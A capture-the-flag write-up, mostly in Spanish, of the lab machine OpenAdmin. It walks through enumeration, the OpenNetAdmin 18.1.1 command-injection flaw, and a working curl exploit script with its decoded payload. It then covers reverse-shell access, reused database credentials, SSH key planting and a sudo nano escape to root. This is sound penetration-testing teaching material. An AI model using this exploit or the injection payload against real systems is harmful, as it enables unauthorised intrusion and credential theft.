---
title: OpenAdmin WriteUp
author: emilio1625
date: 2020-04-08
---

# Detalles de la máquina

| | |
|------------|--------------|
| Nombre     | OpenAdmin    |
| IP         | 10.10.10.171 |
| SO         | Linux        |
| Dificultad | Fácil        |
| Tipo       | CVE          |
|------------|--------------|

# Enumeración

Comenzamos realizando enumeración de la computadora, usamos nmap para conocer
que servicios están ejecutándose en la computadora.

```shell
# nmap -A 10.10.10.171
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-05 16:55 CDT
Nmap scan report for 10.10.10.171
Host is up (0.23s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.04 seconds
```

Vemos que esta computadora tiene un servidor apache en el puerto 80 y ssh se
esta ejecutando en el puerto 22. Vamos al navegador a ver que encontramos en el
servidor web, vemos que tiene la pagina default de apache en ubuntu, asi que
lanzamos gobuster para encontrar alguna página que se este sirviendo en otro
path.

```shell
$ gobuster dir -u 10.10.10.171 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.171
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/04/05 16:58:45 Starting gobuster
===============================================================
/music (Status: 301)
```

Encontramos un primer resultado en `/music`. Si ingresamos a esa pagina vemos un
enlace de login en el menu de la página, al dar clic se nos envía a una pagina
de administración de un producto llamado OpenNetAdmin, y vemos que hay un
mensaje informando que el servidor esta usando una versión desactualizada. Quizá
esta versión es vulnerable y podemos encontrar un exploit en la red. Según el
mensaje se esta usando la version 18.1.1 de OpenNetAdmin, y el exploit es de los
primeros resultado en Google. El exploit es de tipo RCE, es decir podemos
ejecutar comandos remotos en el servidor y tratar de escalar privilegios.

# Exploit

El exploit con `EDB-ID 47691` en exploit-db.com es un script muy sencillo que
se aprovecha de la ausencia de validación de la entrada en un comando AJAX en
ONA, esa entrada sin validación es pasada a la función `shell_exec()` y la
salida del comando es formateada y enviada de regreso al cliente. 

Hay dos fragmentos de código importantes en la vulnerabilidad como se puede ver
en [el commit que arregla este
fallo](https://github.com/opennetadmin/ona/commit/0ab7fd7c163108e9dd060eb65ec1a2160823ff3f)
el primero es cuando se crea un enlace cuyo propósito es hacer ping a una
dirección ip, en el código se inyecta usando php una ip en una petición ajax en
la interfaz del usuario.


```php
if ($record['netstatus'] == "down") {
...
    if (($record['netip'] == $record['dbip']) or ($record['netdnsname'] != $record['dbdnsname'])) {
    $action = <<<EOL
        {$act_status_partial}
        <a title="Ping" class="act"
        onClick="xajax_window_submit('tooltips',
            'name=>tooltips',
            'window_progressbar');xajax_window_submit('tooltips',
            // aquí se introduce una dirección ip en la petición por ajax
            'ip=>{$record['dbip']}', 'ping');"
            >Ping to verify</a> then delete as desired
EOL;
    }
}
```

Esta petición después es procesada sin sanitizar la ip y es añadida a una
comando que se ejecuta en la shell y su salida es devuelta entre un montón de
xml.

```php
// Simple ping function that takes an IP in and pings it.. then shows the output in a module results window
function ws_ping($window_name, $form='') {

    // If an array in a string was provided, build the array and store it in $form
    $form = parse_options_string($form);

    // Aquí se usa la ip sin sanitizar y se envía directo a la shell
    $output = shell_exec("ping -n -w 3 -c 3 {$form['ip']}");

    $window['title'] = 'Ping Results';
    $build_commit_html = 0;
    $commit_function = '';
    include(window_find_include('module_results'));
    return(window_open("{$window_name}_results", $window));
}
```

El exploit se aprovecha de esto para ejecutar más comandos después de ping.
Vamos a ver que hace el exploit. 

```shell
URL="${1}"
while true; do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```

Al principio leemos la URL de la instancia de ONA vulnerable y leemos de `stdin`
el comando a ejecutar en el servidor vulnerable. Luego se usa el comando `curl`
para hacer una petición GET al servidor. La petición esta codificada, si la
decodificamos queda

```
xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip=>;echo\"BEGIN\";${cmd};echo\"END\"&xajaxargs[]=ping
```

El payload se encuentra en el penúltimo parámetro de la petición GET
`&xajaxargs[]=ip=>;echo\"BEGIN\"; ${cmd};echo\"END\"` el punto y coma justo
después de `ip=>` termina el comando de ping e inmediatamente añade un `BEGIN` a
la salida usando `echo` para después poder filtrar la salida de nuestro comando
del resto de la respuesta del servidor, luego sigue un punto y coma, nuestro
comando que fue guardado en la variable `cmd` y por último añade la palabra
`END`. Con esto se crea la petición maligna al servidor, curl la envía, el
servidor ejecuta el comando, guarda la salida en la variable $output, la
formatea entre xml, la envía de vuelta a curl y el exploit filtra la salida con
`sed` para obtener solo lo que esta entre `BEGIN` y `END` incluyendo estas
palabras, con `tail` quita `END` y con `HEAD` quita `BEGIN`.

# Intrusión en el servidor

Ahora que podemos ejecutar comandos en el servidor usamos netcat para crear una
reverse shell y usando python logramos hacerla una shell interactiva. Ahora
debemos buscar una forma de obtener las credenciales de algún usuario. Listamos
los archivos del servidor y buscamos credenciales que podrían haber sido
reutilizadas.

```shell
$ ls
config
config_dnld.php
dcm.php
images
include
index.php
local
login.php
logout.php
modules
plugins
winc
workspace_plugins
```

Lo siento, el resto del write up lo escribí en inglés y me da flojera traducirlo
al español, esto sucede siempre que retomo algo y no recuerdo en que idioma
estaba trabajando xDD.

After some files inspection, we found that local/config contains configuration
files of OpenNetAdmin and contains info to access a database

```shell
$ cat local/config/database_settings.inc.php 
```

```php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

?>
```

Also 2 users are found in the /etc/passwd file

```
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
```

We found that jimmy reused its password for the database

```shell
$ su - jimmy
```

# Lateral Movement

In the /var/www folder we found another site which can only be read by the
'internal' group, to which jimmy belongs

If we look at the apache config files in /etc/apache2/sites-enabled we see that
this internal site can only be accessed from localhost, so we need a reverse
proxy. For this we setup local port forwarding using ssh and jimmy's
credentials.

```shell
$ ssh -L 9999:localhost:52846 jimmy@10.10.10.171
```

This way we go to localhost:9999 in our browser and we can see the restricted
site.

Inspecting the contents of the /var/www/internal folder we found that the
index.php file check for some credentials, the username is jimmy and the hash of
the password is
`00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e99` for
which we found a partial coincidence in a rainbow table: "Revealed". When we try
this credentials in the browser it redirects us to a private ssh key for joanna.

When checking the contents of the index.php file we see that it redirects to the
main.php file. This file echos the content of the private key of joanna from the
/home/joanna/.ssh/id_rsa, but this file id a encrypted ssh key, so we are not
going to decrypt it. Rather, we notice that this script has access to this file,
so maybe it can also write to the /home/joanna/.ssh folder, or even to the
authorized_keys file, so we add a new line to the php script, echoing our public
key and then trying to connect using ssh and this way we have access to joanna's
account.

# Privilege escalation

The first command we try in this account is `sudo -l` which shows that we can use
the command `nano /opt/priv` using sudo without password, so launching `sudo
nano /opt/priv` opens up nano as root, from here we search in GTFOBins how to
spawn a shell from within nano and we get a shell. The flag was in
/root/root.txt

